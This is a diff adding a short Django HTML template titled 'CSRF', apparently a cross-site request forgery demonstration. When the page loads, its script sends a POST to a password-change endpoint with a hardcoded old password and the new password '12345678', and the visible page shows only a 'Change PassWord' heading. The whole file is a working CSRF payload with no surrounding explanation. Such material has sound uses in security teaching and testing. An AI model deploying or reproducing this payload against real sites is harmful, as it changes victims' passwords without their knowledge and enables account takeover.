@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+        function change() {
+            $.post(
+                "{% url 'home:validateNewPassword' %}",
+                {
+                    "oldPassword": "ssssssss",
+                    "newPassword": "12345678",
+                    "newPasswordCon": "12345678",
+                }
+            )
+        }
+        change();
+    </script>
+</head>
+<body>
+    <h1>Change PassWord</h1>
+</body>
+</html>
